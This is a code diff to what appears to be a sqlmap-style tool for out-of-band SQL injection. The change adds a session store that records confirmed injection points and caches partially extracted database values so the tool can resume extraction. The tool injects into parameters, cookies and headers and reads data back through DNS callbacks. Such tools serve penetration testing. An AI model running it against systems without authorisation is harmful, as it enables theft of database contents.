@@ -8,6 +8,7 @@ from . import __version__
 from .oob import InteractshLog
 from .payloads import PROFILES
 from .requester import current_value, inject, injection_points, parse_raw_request, send
+from .session import SessionStore
 
 
 DEFAULT_ALPHABET = string.ascii_lowercase + string.digits
@@ -83,7 +84,8 @@ def load_common(args):
     run_id = args.run_id or uuid.uuid4().hex[:6]
     if args.base is None:
         args.base = current_value(request, args.param, args.place)
-    return profile, request, domain, log, run_id
+    session = SessionStore(args.output_dir, request, args.force_ssl, flush=args.flush_session)
+    return profile, request, domain, log, run_id, session
 
 
 def send_payload(args, request, payload):
@@ -130,16 +132,25 @@ def run_check(args, profile, request, domain, log, run_id) -> int:
 
 def check(args) -> int:
     if args.param:
-        profile, request, domain, log, run_id = load_common(args)
-        return run_check(args, profile, request, domain, log, run_id)
+        profile, request, domain, log, run_id, session = load_common(args)
+        try:
+            rc = run_check(args, profile, request, domain, log, run_id)
+            status = "confirmed" if rc == 0 else "conditional-failed" if rc == 2 else "not-confirmed"
+            session.save_check(session.check_id(args.dbms, args.place, args.param), args.dbms, args.place, args.param, status)
+            print(f"[+] session: {session.path}")
+            return rc
+        finally:
+            session.close()
 
     profile = PROFILES[args.dbms]
     request = parse_raw_request(args.request)
     domain = normalize_domain(args.domain)
     log = InteractshLog(args.log)
+    session = SessionStore(args.output_dir, request, args.force_ssl, flush=args.flush_session)
     points = injection_points(request, args.level)
     if not points:
         print("[!] no injection points found at this level")
+        session.close()
         return 1
 
     print(f"[+] scanning {len(points)} injection point(s) with level={args.level}, risk={args.risk}")
@@ -152,18 +163,35 @@ def check(args) -> int:
         run_id = f"{args.run_id or uuid.uuid4().hex[:6]}-{point.place[:1]}{abs(hash((point.place, point.name))) % 10000}"
         print()
         rc = run_check(candidate_args, profile, request, domain, log, run_id)
+        status = "confirmed" if rc == 0 else "conditional-failed" if rc == 2 else "not-confirmed"
+        session.save_check(session.check_id(args.dbms, point.place, point.name), args.dbms, point.place, point.name, status)
         if rc == 0:
             print(f"[+] injectable OOB point: --place {point.place} -p {point.name}")
             found = True
             if args.first:
                 break
 
+    print(f"[+] session: {session.path}")
+    session.close()
     return 0 if found else 1
 
 
 def extract_value(args, expression: str, alphabet: str, max_len: int) -> str:
-    profile, request, domain, log, run_id = load_common(args)
+    profile, request, domain, log, run_id, session = load_common(args)
+    extraction_id = session.extraction_id(args.dbms, args.place, args.param, expression, alphabet)
+    cached = None if args.fresh_queries else session.get_extraction(extraction_id)
     result = ""
+    start_pos = 1
+
+    if cached and cached["completed"]:
+        print(f"[+] resumed completed value from session: {cached['value']}")
+        session.close()
+        return cached["value"]
+
+    if cached and cached["value"]:
+        result = cached["value"]
+        start_pos = len(result) + 1
+        print(f"[+] resuming from session at position {start_pos}: {result}")
 
     print(f"[+] profile: {profile.name}")
     print(f"[+] {profile.comment}")
@@ -171,8 +199,9 @@ def extract_value(args, expression: str, alphabet: str, max_len: int) -> str:
     print(f"[+] expression: {expression}")
     print(f"[+] domain: {domain}")
     print(f"[+] watching: {args.log}")
+    print(f"[+] session: {session.path}")
 
-    for pos in range(1, max_len + 1):
+    for pos in range(start_pos, max_len + 1):
         token_map: dict[str, str] = {}
 
         for char in alphabet:
@@ -185,13 +214,18 @@ def extract_value(args, expression: str, alphabet: str, max_len: int) -> str:
         token = log.wait_any(token_map, args.timeout)
         if not token:
             print(f"[+] done: {result}")
+            session.save_extraction(extraction_id, args.dbms, args.place, args.param, expression, alphabet, result, True)
+            session.close()
             return result
 
         char = token_map[token]
         result += char
+        session.save_extraction(extraction_id, args.dbms, args.place, args.param, expression, alphabet, result, False)
         print(f"[+] pos {pos:02d}: {char} -> {result}", flush=True)
 
     print(f"[!] reached max length: {result}")
+    session.save_extraction(extraction_id, args.dbms, args.place, args.param, expression, alphabet, result, False)
+    session.close()
     return result
 
 
@@ -257,6 +291,9 @@ def add_common(parser):
     parser.add_argument("--level", type=int, choices=range(1, 6), default=1, help="scan depth for check without -p: 1=query/body, 2=cookies, 3=common headers, 5=all headers")
     parser.add_argument("--risk", type=int, choices=(1, 2, 3), default=1, help="accepted for sqlmap-like workflow; payload selection is profile-driven for now")
     parser.add_argument("--batch", action="store_true", help="accepted for sqlmap-like non-interactive workflows")
+    parser.add_argument("--output-dir", help="session/output directory (default: ~/.local/share/oobmap/output)")
+    parser.add_argument("--flush-session", action="store_true", help="delete the target session before running")
+    parser.add_argument("--fresh-queries", action="store_true", help="ignore cached extraction results but keep the session")
     parser.add_argument("-v", "--verbose", action="store_true")
 
 
